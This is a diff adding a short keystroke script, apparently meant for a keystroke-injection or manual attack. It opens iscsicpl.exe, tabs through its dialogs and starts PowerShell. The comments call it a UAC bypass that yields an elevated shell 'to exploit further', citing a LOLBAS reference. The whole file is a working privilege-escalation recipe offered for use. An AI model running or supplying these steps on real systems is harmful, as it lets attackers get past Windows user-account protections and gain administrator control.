@@ -1,0 +1,13 @@
+Win + R
+iscsicpl.exe
+enter
+CTRL + TAB x 5
+4 Tabs
+wait
+6 tabs
+enter
+powershell
+
+# These instructions pop us into a elevated UAC bypasses powershell and allow us to exploit further
+# Reference point is https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/#uac bypass
+# Leverages c:\windows\syswow64\iscsicpl.exe to elevate powershell
